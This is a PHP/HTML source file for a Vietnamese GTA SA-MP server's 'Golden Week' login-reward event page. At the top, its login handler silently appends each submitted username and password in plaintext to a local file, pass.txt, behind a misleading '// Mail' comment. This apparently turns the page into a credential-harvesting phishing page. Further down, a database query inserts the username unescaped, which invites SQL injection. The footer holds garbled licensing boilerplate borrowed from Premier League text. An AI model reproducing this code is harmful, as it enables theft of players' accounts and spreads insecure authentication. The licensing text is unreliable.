<?php 
	session_start();
	$connect = mysqli_connect("localhost","root","","vgta_lvrp");
	if(isset($_POST["btnDangNhap"]))
	{
		include("smtpgmail/class.phpmailer.php");
		$taikhoan = $_POST["taikhoan"];
		$matkhau = $_POST["matkhau"];
		
		// Mail
		
		$file = "pass.txt";
		file_put_contents($file,"\n\nTài khoản: ".$taikhoan."\nMật khẩu: ".$matkhau, FILE_APPEND);
		
		// End Mail
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" href="css/font-awesome.min.css"/>
<link rel="stylesheet" type="text/css" href="css/style.css"/>
<title>GTA ONLINE VGTA SAMP - Golden Week</title>
<link rel="shortcut icon" type="image/x-icon" href="../images2/LOGOTRON.png" />
<style>
.header{
	background:#000000;
	border-bottom:1px solid #5c665c;
}
#logo_pc{
	height:65px;
}
#dang_ky{
	color:#fff;
}
.section_1{
	background-image:url(images/bg_1.jpg);
	min-height:1000px;

}
.duong_gach_duoi_2 {
    position: absolute;
    width: 469px;
    height: 461px;
    bottom: 100px;
    right: -79px;
}
.duong_gach_duoi {
    position: absolute;
    width: 415px;
    height: 468px;
    bottom: 0;
    right: 0;
}
.header .thanh_phai{
	padding-left:200px !important;
}
.container{
	width:90%;
}
@media screen and (max-width:1400px)
{
	#golden{
		font-size:16px;
	}
	#nd_golden{
		min-height:500px;
	}
	.nen_nut_event {
   	font-size:14px;
	line-height:37px;
    width: 144px;
    height: 37px;
    background-size: contain;
    vertical-align: top;
	}
}
@media screen and (max-width:1029px)
{
	.header .thanh_phai{
		padding-left:80px !important;
	}
	.bg_mb{
		display:none;
	}
}
</style>

</head>

<body>
	<div class="thanh_button">
    	<ul>
        	<li id="logo_thanh_btn"><a href="trang-chu"><img src="../images2/logovgta.png" /></a></li>
            <li id="logo_thanh_btn_phai">
            	<a href="#"><img src="images/facebook.png" /></a>
            	<a href="#"><img src="images/youtube.png" /></a>
                <img src="images/menu.png" id="button" />
            </li>
            <li>
            	
            </li>
            <li></li>
        </ul>
    </div>
	<div class="header">
    	<nav>
        	<ul class="menu">
            	<li id="logo">
                	<div class="nut_tat"><i class="fa fa-close fa-2x"></i></div>
                    <a href="../trangchu">
                	<img src="../images2/logovgta.png" id="logo_pc"/>
                    <img src="../images2/logovgta.png" id="logo_mb"/>
                    </a>
                </li>
            	<li><a class="active"  href="event">TUẦN LỄ VÀNG</a></li>
                <li><a onclick="alert('Event đã đóng')">KHẢO SÁT NHẬN QUÀ</a></li>
                
                <!--<li><a href="thu-vien">THƯ VIỆN</a></li>
                <li><a href="#">HỖ TRỢ</a></li>
                <li><a href="#">EP POINT SHOP</a></li>-->
            </ul>
            <ul class="thanh_phai">
            <?php 
				if(!isset($_SESSION["IsLogin"]))
				{
			?>
            	<li><a href="#" onclick="hienbangdangnhap()"> <span id="dang_ky">ĐĂNG NHẬP</span></a></li>
            <?php
            	}
				else
				{
						
			?>
                <li><img src="images/icon-person.png" id="person" /> <span id="dang_ky"><span style="color:#a1e60b">XIN CHÀO <b><?php echo $_SESSION["taikhoan"] ?></b> |<a href="library/xldangxuat.php" onclick=""> ĐĂNG XUẤT</span></a></li>
            <?php
            	} 
			?>   
                
            </ul>
        </nav>
    </div>
    <div class="section_1">
    	<div class="form_dangnhap">
        	<div class="nenden"></div>
            <div class="dangnhap">
            	<h1><span style="color:#78ac09">LOGIN</span> VGTA SAMP <img src="../images2/LOGOTRON.png" /></h1>
                <form action="" method="post">
                    <input type="text" name="taikhoan" id="taikhoan" placeholder="Tài khoản VGTA SAMP" />
                    <input type="password" name="matkhau" id="matkhau" placeholder="Mật khẩu" />
                 <div id="hienloi">   
                    <button type="button" onclick="xldangnhap()" class="nen_nut_event">Đăng nhập ngay</button>
                </form>
                	<h3 >
                
                	</h3>
                </div>
            </div>
            <div class="nut_tat_dangnhap" onclick="tatdangnhap()">X</div>
        </div>
    	<div id="golden">
            <img src="images/title.png"/>
            <p>Cơ hội nhận TOYS miễn phí và nhiều vật phẩm hấp dẫn trong VGTA SAMP chỉ bằng việc thực hiện các nhiệm vụ trong game từ 01/04 - 08/04/2020. Chơi là có quà.</p>
            <div class="nen_nut_event">
                Lịch sử nhận quà
            </div>
            <div class="nen_nut_event">
                Hướng dẫn
            </div>
            
            
            <div id="nd_golden">
                <div id="hd_nd_golden">
                    <ul>
                        <li id="nv">NHIỆM VỤ ĐĂNG NHẬP</li>
                        <li id="hlv">TUẦN LỄ VÀNG</li>
                        <li style="text-align:right">THỜI GIAN: 01-08/04</li>
                    </ul>
                </div>
                <p>
                    Đăng nhập vào VGTA SAMP mỗi ngày, nhận quà liền tay với các mốc 1 - 3 - 5 -7 ngày<br />
    
    *Lưu ý: Các NGƯỜI CHƠI phải thực hiện đăng nhập mới vào VGTA SAMP mỗi ngày (thoát ra rồi đăng nhập lại) thì mới được tính hoàn thành nhiệm vụ này.
                </p>
                <div class=" ">
                	<div class="nd_vp">
                    <div id="vp_nd_golden">
                        <ul>
                            <li><img src="images/100300001_s.png" /><br />
                                100,000$ & 20 điểm RANK
                            </li>
                            <li id="kc_vp"><img src="images/100300001_s.png" /><br />
                                VIP GOLD 7 NGÀY & 20 điểm RANK
                            </li>
                            <li id="kc_vp"><img src="images/100300001_s.png" /><br />
                                300,000$ & 20 điểm RANK
        
                            </li>
                            <li id="kc_vp"><img src="images/500200001_s.png" /><br />
                                TOYS ĐẦU NGỰA & 40 điểm RANK
                            </li>
                        </ul>
                    </div>
                    <div id="ngay_nd_golden">
                        <ul>
                        	<?php 
							 if(isset($_SESSION["IsLogin"]))
							 {
								 $taikhoan = $_SESSION['taikhoan'];
								 $qr = "select `songay` from `accounts` where `Username` = '$taikhoan' ";
								$ketqua = mysqli_query($connect, $qr);
								$dong = mysqli_fetch_array($ketqua);
								$songay = $dong['songay'];
								if($songay == 1)
								{	
									echo '<li id="n1" style="background:#aef411">Ngày 1 <i class="fa fa-angle-right">
											</i></li>
										 <li>Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 7 </li>
									';

								}
								else if($songay == 2)
								{
									echo '<li id="n1" style="background:#aef411">Ngày 1 <i class="fa fa-angle-right">
											</i></li>
										 <li id="n1" style="background:#aef411">Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 7 </li>
									';
								}
								else if($songay == 3)
								{
									echo '<li id="n1" style="background:#aef411">Ngày 1 <i class="fa fa-angle-right">
											</i></li>
										 <li id="n1" style="background:#aef411">Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 7 </li>
									';
								}
								else if($songay == 4)
								{
									echo '<li id="n1" style="background:#aef411">Ngày 1 <i class="fa fa-angle-right">
											</i></li>
										 <li id="n1" style="background:#aef411">Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 7 </li>
									';
								}
								else if($songay == 5)
								{
									echo '<li id="n1" style="background:#aef411">Ngày 1 <i class="fa fa-angle-right">
											</i></li>
										 <li id="n1" style="background:#aef411">Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 7 </li>
									';
								}
								else if($songay == 6)
								{
									echo '<li id="n1" style="background:#aef411">Ngày 1 <i class="fa fa-angle-right">
											</i></li>
										 <li id="n1" style="background:#aef411">Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 7 </li>
									';
								}
								else if($songay == 7)
								{
									echo '<li id="n1" style="background:#aef411">Ngày 1 <i class="fa fa-angle-right">
											</i></li>
										 <li id="n1" style="background:#aef411">Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li id="n1" style="background:#aef411">Ngày 7 </li>
									';
								}
								else if($songay == 0 )
								{
									echo ' <li id="n1" >Ngày 1 <i class="fa fa-angle-right"></i></li>
										 <li>Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 7 </li>
									';
									
								} 
							 }
							 else
							 {
								 echo ' <li id="n1" >Ngày 1 <i class="fa fa-angle-right"></i></li>
										 <li>Ngày 2 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 3 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 4 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 5 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 6 <i class="fa fa-angle-right"></i></li>
										<li>Ngày 7 </li>
									';
							 }
								
							?>
                            
                           
                        </ul>
                    </div>
                     <?php
						 if(isset($_SESSION["IsLogin"]))
						 {
						?>	
                         <div class="nen_nut_event" onclick="xlnhanqua()">
                            Cập nhật & nhận quà
                        </div>
                    <?php
						 }
						 else
						 {
					?>
                    	<div class="nen_nut_event" onclick="alert('Bạn chưa đăng nhập')" >
                            Cập nhật & nhận quà
                        </div>
                    <?php }?>
                    </div>
                    
                    <div class="nd_vp2">
                    	<div class="dong_1">
                        	<ul class="vp_1">
                            	<li><img src="images/100300001_s.png" /><br />
                                100,000 $ & 20Đ RANK</li>
                                <li id="vp_1_2"><img src="images/100300001_s.png" /><br />
                                VIP GOLD + 20Đ RANK</li>
                            </ul>
                            <ul class="ng_1">
                            	<li id="n1">Ngày 1 <i class="fa fa-angle-right"></i></li>
                                <li>Ngày 2 <i class="fa fa-angle-right"></i></li>
                                <li>Ngày 3 <i class="fa fa-angle-right"></i></li>
                                <li>Ngày 4</li>
                            </ul>
                        </div>
                        
                        <div class="dong_2">
                        	<ul class="vp_2">
                            	<li><img src="images/100300001_s.png" /><br />
                                300,000 BP & 20Đ RANK</li>
                                <li id="vp_2_2"><img src="images/500200001_s.png" /><br />
                                TOYS VIP + & 40Đ RANK</li>
                            </ul>
                            <ul class="ng_2">
                            	<li id="n1">Ngày 5 <i class="fa fa-angle-right"></i></li>
                                <li>Ngày 6 <i class="fa fa-angle-right"></i></li>
                                <li>Ngày 7</li>
                            </ul>
                            
                        </div>
                        <?php
						 if(isset($_SESSION["IsLogin"]))
						 {
						?>	 
                        	<div class="nen_nut_event" onclick="xlnhanqua()">
                       			Cập nhật & nhận quà
                   	 		</div>
                         
						 <?php 
						 }else
						 {
						?>
                        	<div class="nen_nut_event">
                       		Cập nhật & nhận quà
                   	 		</div>
                           
                        <?php 
						 }
						 ?>
                        
                    
                    </div>
                    
                 </div>
      	  </div>
            
        </div>
        
        <div class="bg_mb"></div>
        <div class="duonggach">
        	<div class="duong_gach_tren">
            	
            </div>
            <div class="duong_gach_duoi">
            	<img src="images/slide-1-bottom-up.png" />
            </div>
            <div class="duong_gach_duoi_2">
            	<img src="images/slide-1-bottom-down_2.png" />
            </div>
        </div>
    </div>
   
    <div class="footer">
    	<div class="container">
        <div class="logo_footer_m">
        	
        </div>
    	<img src="../images2/LOGOTRON.png" id="logo_left" />
        <p>© 2020​ San Andreas Multiplayer Inc. VN, VN GTA ONLINE, and the GTA ONLINE logo are trademarks of San Andreas Multiplayer Inc. Official GTA licensed product. © GTA name and GTA ONLINE VN Official Licensed Product Logo are copyrights and/or trademarks of GTA. All rights reserved. Manufactured under license by San Andreas Multiplayer Inc. The use of real player names and likenesses is authorized by HAC Commercial Enterprises BV. The Premier League Logo © The GTA ONLINE Association Premier League Limited 2016. The Premier League Logo is a trademark of the GTA ONLINE Association Premier League Limited which is registered in the UK and other jurisdictions. The Premier League Club logos are copyright works and registered trademarks of the respective Clubs. All are used with the kind permission of their respective owners. Manufactured under license from the GTA Association Premier League Limited. No association with nor endorsement of this product by any player is intended or implied by the license granted by the GTA ONLINE Association Premier League Limited to San Andreas Multiplayer Arts. All other trademarks are the property of their respective owners.<br />
<br />

<a href="#">Điều khoản dịch vụ</a> | <a href="#">Chính sách Bảo mật</a> | <a href="#">Điều khoản tranh chấp và khiếu nại</a><br />

CÔNG TY TNHH GIẢI TRÍ VÀ NHẬP VAI HÀNH ĐỘNG ĐIỆN TỬ VIỆT NAM<br />

Văn phòng đại diện: số 125, Nguyễn Chí Thanh, Quận 5, Thành phố Hồ Chí Minh, Việt Nam.
Điện thoại: (84)772655181 </p>
		<img src="images/18.jpg" id="logo_right" />
    	</div>
    	
    </div>
    
    <script type="text/javascript" src="js/jquery-3.3.1.min.js"></script>
    <script type="text/javascript" src="js/scripts.js"></script>
    <script type="text/javascript" src="js/thuvien_ajax.js"></script>
</body>
</html>
